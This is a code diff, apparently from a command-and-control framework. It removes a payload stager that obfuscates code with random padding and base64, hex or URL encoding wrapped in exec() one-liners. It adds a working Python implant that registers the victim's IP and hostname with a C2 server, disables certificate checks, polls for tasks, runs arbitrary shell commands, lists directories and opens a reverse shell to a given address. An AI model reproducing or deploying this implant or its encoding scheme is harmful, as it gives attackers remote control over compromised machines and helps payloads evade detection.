@@ -1,67 +1,52 @@
-    if stager_db.listener.type not in AVAILABLE_PAYLOADS:  # also works as the stager type
-        raise ValueError(f"Stager {stager_db.listener.type} is not available.")
-    # Get the Payload from the File
+import multiprocessing
+import os
+import socket
+import subprocess as sp
+import time
+
+import requests as r
+import urllib3
+
+time.sleep(1)
+URL = "https://192.168.178.107:10000/"
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def reverse_shell(address: str, port: int):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address, int(port)))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    sp.call(["/bin/sh", "-i"])
+
+data = {
+    "address": socket.gethostbyname(socket.gethostname()),
+    "hostname": sp.getoutput("hostname")
+}
+name = r.post(f"{URL}/connect", json=data, verify=False).text
+
+for _ in range(200):
+    time.sleep(5)
     try:
-        with open("Payloads/" + stager_db.listener.type + ".py", "r") as f:
-            payload = f.read()
-    except Exception as e:
-        raise FileNotFoundError("Couldn't find the payload.") from e
-
-    # Randomize the Payload
-    if stager_db.random_size:
-        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
-            "'" + "".join(random.choices(string.ascii_letters +
-                          string.digits, k=random.randint(100, 500))) + "'"
-        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
-            "'" + "".join(random.choices(string.ascii_letters +
-                          string.digits, k=random.randint(100, 500))) + "'"
-    else:
-        start = ""
-        end = ""
-
-    # Replace the Payload
-    finished_payload = start + "\n"
-    finished_payload += f"import time\ntime.sleep({stager_db.delay})\n"
-    finished_payload += f"HOST = '{stager_db.listener.address}'\n" \
-        f"PORT = {stager_db.listener.port}\n" \
-        f"TIMEOUT = {stager_db.timeout}\n" \
-        f"SSL={stager_db.listener.ssl}\n"
-    finished_payload += payload + "\n" + end
-
-    # Encode the Payload
-    if not one_liner and stager_db.format != "exe":
-        if stager_db.encoding == "base64":
-            finished_payload = base64.b64encode(
-                finished_payload.encode()).decode()
-        elif stager_db.encoding == "hex":
-            finished_payload = hexlify(finished_payload.encode()).decode()
-        elif stager_db.encoding == "url":
-            finished_payload = urllib.parse.quote(finished_payload)
-        elif stager_db.encoding == "raw":
-            ...
-        else:
-            raise ValueError("Encoding not supported")
-    else:
-        if stager_db.encoding == "base64":
-            finished_payload = "import base64;" \
-                "exec(base64.b64decode(b'%s'))" % base64.b64encode(
-                    finished_payload.encode()).decode()
-        elif stager_db.encoding == "hex":
-            finished_payload = "from binascii import unhexlify;exec(unhexlify('%s'))" % hexlify(
-                finished_payload.encode()).decode()
-        elif stager_db.encoding == "url":
-            finished_payload = "import urllib.parse;" \
-                "exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
-                    finished_payload)
-        elif stager_db.encoding == "raw":
-            ...
-        else:
-            raise ValueError("encoding not supported")
-
-    if stager_db.format == "py":
-        return finished_payload
-    elif stager_db.format == "exe":
-        # Create the EXE
-        pass
-    else:
-        raise ValueError("Unknown Format")
+        tasks = r.get(URL + "/tasks/" + name, verify=False)
+    except:
+        continue
+    tasks = tasks.json()
+    for task in tasks:
+        if task["type"] in ["rce", "dir", "reverse-shell"]:
+            data = {
+                "id": task["id"],
+                "success": True
+            }
+            if task["type"] == "rce":
+                data["output"] = sp.getoutput(task["args"]["cmd"])
+            elif task["type"] == "dir":
+                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
+            elif task["type"] == "reverse-shell":
+                multiprocessing.Process(target=reverse_shell, args=(
+                    task["args"]["address"], task["args"]["port"])).start()
+                data["output"] = "Send reverse shell"
+            res = r.post(URL + "/finish/" + name, json=data, verify=False)
